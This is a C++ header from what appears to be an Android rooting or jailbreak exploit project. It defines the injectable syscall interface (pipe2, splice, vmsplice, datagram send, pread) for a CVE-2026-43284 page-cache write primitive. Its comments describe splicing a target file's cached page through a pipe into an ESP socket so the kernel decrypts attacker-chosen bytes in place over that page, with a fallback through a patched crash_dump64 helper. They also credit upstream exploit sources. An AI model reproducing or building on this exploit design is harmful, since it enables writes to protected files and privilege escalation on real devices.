#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_PAGECACHE_SPLICE_IO_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_PAGECACHE_SPLICE_IO_HPP

/* B5-3 injectable syscall surface for the page-cache block write.
 *
 * The primitive must splice the target file's page-cache page into a pipe and
 * then splice that pipe to the ESP socket, so the kernel decrypts the ESP
 * payload in place over the shared page. Every syscall involved
 * (pipe2/splice/vmsplice/sendmsg/pread/close) sits behind this one replaceable
 * interface: the device binding is real_splice_io(); host tests bind a fake and
 * pagecache.cpp therefore has no direct syscall dependency.
 *
 * Mapping to DirtyFrag-Android-Root-Jailbreak@de2ab7b usermode/{ankit/exp.c,
 * lspromise/splicehelper.c, dirtyinit/dfi_exploit.c}: the 16-byte page-frag
 * splice and the vmsplice header/IV/ICV pipe assembly. Attribution follows the
 * //TODO(mechanical-comment-path-fix): 机械改动：注释路径修正（计划已归档，路径改写；无语义变更）。
 * vendored-source plan (docs/archive/20261007-2237-cve-2026-43284-refactor-plan.md section
 * 2); the upstream repositories ship no LICENSE, so this is an independent
 * rewrite.
 *
 * ADR-0004 R1: this is a backend submodule header and must not include
 * pipeline/. */

#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43284::pagecache {

    /* Injected source for the 16-byte old block the CBC IV/ICV derivation
     * needs. The default (unbound) source is the direct file_fd pread in
     * pagecache::read_block(); a vendor carrier the App/shell cannot read
     * directly binds this to the crash_dump bridge. A bound source is consulted
     * only after the direct read failed, so non-vendor behavior is unchanged
     * and a bridge failure fails the block closed (no ESP datagram). */
    struct OldPageSource final {
        void *ctx = nullptr;
        long (*read16)(void *ctx, std::uint64_t offset,
                       std::uint8_t out[16]) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept { return read16 != nullptr; }
    };

    /* Injected source for the ciphertext page when the App cannot open the
     * target file at all (file_fd < 0). The real binding execs the already
     * patched crash_dump64 helper with its stdout bound to the write pipe; the
     * helper splice(2)s the vendor page directly into that pipe
     * (exp.c do_one_write_cbc use_helper=1), so the ESP datagram still carries
     * the kernel page and decrypt-in-place is unchanged. A bound source is
     * consulted only when file_fd cannot supply the page; a helper failure
     * fails the block closed (no ESP datagram). */
    struct HelperWriteSource final {
        void *ctx = nullptr;
        /* Put the 16-byte block at offset into pipe_write_fd. Returns 16 on
         * success, a negative -errno on failure, or any other short count. */
        long (*splice16)(void *ctx, int pipe_write_fd,
                         std::uint64_t offset) noexcept = nullptr;

        [[nodiscard]] bool available() const noexcept { return splice16 != nullptr; }
    };

    struct SpliceIoOps final {
        /* Create a pipe. Returns 0 on success, or -errno on failure. */
        int (*pipe2)(int fds[2], int flags) noexcept = nullptr;

        /* Transfer up to len bytes from fd_in to fd_out. off_in/off_out are
         * optional (null for a pipe end) file offsets treated as inputs; the
         * caller advances its own offset by the returned count. Returns the
         * number of bytes transferred, or -errno. */
        long (*splice)(int fd_in, const std::uint64_t *off_in, int fd_out,
                       const std::uint64_t *off_out, std::size_t len,
                       unsigned flags) noexcept = nullptr;

        /* Map len bytes of data into fd (a pipe). Returns the number of bytes
         * mapped, or -errno. */
        long (*vmsplice)(int fd, const std::uint8_t *data, std::size_t len,
                         unsigned flags) noexcept = nullptr;

        /* Send exactly one datagram on a connected socket. Returns len, or
         * -errno. The page-cache primitive transports over splice(); this entry
         * point completes the surface for the in-memory datagram path and keeps
         * a half-bound surface from advertising itself as usable. */
        long (*send_datagram)(int fd, const std::uint8_t *buf,
                              std::size_t len) noexcept = nullptr;

        /* pread-like read: up to len bytes at offset. Returns bytes read,
         * 0 at end of file, or -errno. */
        long (*read_at)(int fd, std::uint8_t *out, std::size_t len,
                        std::uint64_t offset) noexcept = nullptr;

        /* close(2). Returns 0, or -errno. */
        int (*close_fd)(int fd) noexcept = nullptr;

        /* A surface is usable only when every entry point is bound. There is no
         * separate ready flag. */
        [[nodiscard]] bool available() const noexcept {
            return pipe2 != nullptr && splice != nullptr &&
                   vmsplice != nullptr && send_datagram != nullptr &&
                   read_at != nullptr && close_fd != nullptr;
        }
    };

    /* Device binding for Android/Linux. On any other host it returns an
     * all-null surface, so available() is false instead of a link error; the
     * host tests bind their own fake. */
    [[nodiscard]] SpliceIoOps real_splice_io() noexcept;

} // namespace ghostlock::backend::cve_2026_43284::pagecache

#endif
